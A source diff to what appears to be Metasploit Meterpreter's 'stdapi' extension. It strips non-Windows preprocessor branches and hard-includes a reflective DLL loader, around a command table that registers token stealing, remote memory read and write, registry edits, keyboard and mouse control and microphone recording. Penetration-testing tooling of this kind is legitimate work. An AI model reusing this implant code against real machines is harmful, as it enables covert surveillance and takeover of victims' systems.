@@ -7,9 +7,8 @@
 // include the Reflectiveloader() function, we end up linking back to the metsrv.dll's Init function
 // but this doesnt matter as we wont ever call DLL_METASPLOIT_ATTACH as that is only used by the
 // second stage reflective dll inject payload and not the metsrv itself when it loads extensions.
-#ifdef _WIN32
- #include "../../../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"
-#endif
+#include "../../../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"
+
 // NOTE: _CRT_SECURE_NO_WARNINGS has been added to Configuration->C/C++->Preprocessor->Preprocessor
 
 // this sets the delay load hook function, see DelayLoadMetSrv.h
@@ -23,13 +22,11 @@ Command customCommands[] =
 	// General
 	COMMAND_REQ("core_channel_open", request_general_channel_open),
 
-#ifdef WIN32
 	// Railgun
 	COMMAND_REQ("stdapi_railgun_api", request_railgun_api),
 	COMMAND_REQ("stdapi_railgun_api_multi", request_railgun_api_multi),
 	COMMAND_REQ("stdapi_railgun_memread", request_railgun_memread),
 	COMMAND_REQ("stdapi_railgun_memwrite", request_railgun_memwrite),
-#endif
 
 	// Fs
 	COMMAND_REQ("stdapi_fs_ls", request_fs_ls),
@@ -45,10 +42,8 @@ Command customCommands[] =
 	COMMAND_REQ("stdapi_fs_file_copy", request_fs_file_copy),
 	COMMAND_REQ("stdapi_fs_md5", request_fs_md5),
 	COMMAND_REQ("stdapi_fs_sha1", request_fs_sha1),
-#ifdef _WIN32
 	COMMAND_REQ("stdapi_fs_search", request_fs_search),
 	COMMAND_REQ("stdapi_fs_mount_show", request_fs_mount_show),
-#endif
 
 	// Process
 	COMMAND_REQ("stdapi_sys_process_attach", request_sys_process_attach),
@@ -60,7 +55,6 @@ Command customCommands[] =
 	COMMAND_REQ("stdapi_sys_process_get_info", request_sys_process_get_info),
 	COMMAND_REQ("stdapi_sys_process_wait", request_sys_process_wait),
 
-#ifdef _WIN32
 	// Image
 	COMMAND_REQ("stdapi_sys_process_image_load", request_sys_process_image_load),
 	COMMAND_REQ("stdapi_sys_process_image_get_proc_address", request_sys_process_image_get_proc_address),
@@ -107,7 +101,6 @@ Command customCommands[] =
 	COMMAND_REQ("stdapi_registry_enum_value_direct", request_registry_enum_value_direct),
 	COMMAND_REQ("stdapi_registry_query_value_direct", request_registry_query_value_direct),
 	COMMAND_REQ("stdapi_registry_set_value_direct", request_registry_set_value_direct),
-#endif
 
 	// Sys/config
 	COMMAND_REQ("stdapi_sys_config_getuid", request_sys_config_getuid),
@@ -116,12 +109,10 @@ Command customCommands[] =
 	COMMAND_REQ("stdapi_sys_config_rev2self", request_sys_config_rev2self),
 	COMMAND_REQ("stdapi_sys_config_getprivs", request_sys_config_getprivs),
 	COMMAND_REQ("stdapi_sys_config_getenv", request_sys_config_getenv),
-#ifdef _WIN32
 	COMMAND_REQ("stdapi_sys_config_driver_list", request_sys_config_driver_list),
 	COMMAND_REQ("stdapi_sys_config_steal_token", request_sys_config_steal_token),
 	COMMAND_REQ("stdapi_sys_config_drop_token", request_sys_config_drop_token),
 	COMMAND_REQ("stdapi_sys_config_getsid", request_sys_config_getsid),
-#endif
 
 	// Net
 	COMMAND_REQ("stdapi_net_config_get_routes", request_net_config_get_routes),
@@ -131,18 +122,15 @@ Command customCommands[] =
 	COMMAND_REQ("stdapi_net_config_get_arp_table", request_net_config_get_arp_table),
 	COMMAND_REQ("stdapi_net_config_get_netstat", request_net_config_get_netstat),
 
-#ifdef WIN32
 	// Proxy
 	COMMAND_REQ("stdapi_net_config_get_proxy", request_net_config_get_proxy_config),
 	// Resolve
 	COMMAND_REQ("stdapi_net_resolve_host", request_resolve_host),
 	COMMAND_REQ("stdapi_net_resolve_hosts", request_resolve_hosts),
-#endif
 
 	// Socket
 	COMMAND_REQ("stdapi_net_socket_tcp_shutdown", request_net_socket_tcp_shutdown),
 
-#ifdef _WIN32
 	// UI
 	COMMAND_REQ("stdapi_ui_enable_mouse", request_ui_enable_mouse),
 	COMMAND_REQ("stdapi_ui_enable_keyboard", request_ui_enable_keyboard),
@@ -176,7 +164,6 @@ Command customCommands[] =
 	// Audio
 	COMMAND_REQ("webcam_audio_record", request_ui_record_mic),
 
-#endif
 	COMMAND_TERMINATOR
 };
 
@@ -185,15 +172,10 @@ Command customCommands[] =
  * @param remote Pointer to the remote instance.
  * @return Indication of success or failure.
  */
-#ifdef _WIN32
 DWORD __declspec(dllexport) InitServerExtension(Remote *remote)
-#else
-DWORD InitServerExtension(Remote *remote)
-#endif
 {
-#ifdef _WIN32
 	hMetSrv = remote->met_srv;
-#endif
+
 	command_register_all(customCommands);
 
 	return ERROR_SUCCESS;
@@ -204,11 +186,7 @@ DWORD InitServerExtension(Remote *remote)
  * @param remote Pointer to the remote instance.
  * @return Indication of success or failure.
  */
-#ifdef _WIN32
 DWORD __declspec(dllexport) DeinitServerExtension(Remote *remote)
-#else
-DWORD DeinitServerExtension(Remote *remote)
-#endif
 {
 	command_deregister_all(customCommands);
 
@@ -221,16 +199,8 @@ DWORD DeinitServerExtension(Remote *remote)
  * @param bufferSize Size of the \c buffer parameter.
  * @return Indication of success or failure.
  */
-#ifdef _WIN32
 DWORD __declspec(dllexport) GetExtensionName(char* buffer, int bufferSize)
-#else
-DWORD GetExtensionName(char* buffer, int bufferSize)
-#endif
 {
-#ifdef _WIN32
 	strncpy_s(buffer, bufferSize, "stdapi", bufferSize - 1);
-#else
-	strncpy(buffer, "stdapi", bufferSize - 1);
-#endif
 	return ERROR_SUCCESS;
 }
